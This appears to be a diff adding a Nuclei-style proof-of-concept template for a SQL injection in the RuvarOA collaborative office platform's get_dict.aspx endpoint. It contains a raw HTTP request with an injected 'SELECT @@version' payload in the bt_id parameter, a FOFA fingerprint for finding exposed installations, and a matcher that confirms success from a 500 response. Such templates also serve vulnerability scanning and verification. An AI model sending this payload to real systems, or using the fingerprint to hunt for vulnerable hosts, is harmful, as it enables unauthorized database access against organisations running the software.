@@ -1,0 +1,37 @@
+id: poc-icqgqxiq35hqd2hq
+info:
+  name: RuvarOA协同办公平台-get_dict-SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/icqgqxiq35hqd2hq'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: icqgqxiq35hqd2hq
+    fofa: body="txt_admin_key"
+http:
+- raw:
+  - 'GET /include/get_dict.aspx?bi_value=1&bt_id=1%29+AND+1248+IN+%28SELECT+@@version%29+AND+%282558%3D2558&bt_name=1&bi_name=1 HTTP/1.1
+
+
+    Connection: close
+
+
+    # 响应代码特征
+
+    500
+
+
+    # 响应内容特征
+
+    nvarchar
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 500
+    type: status
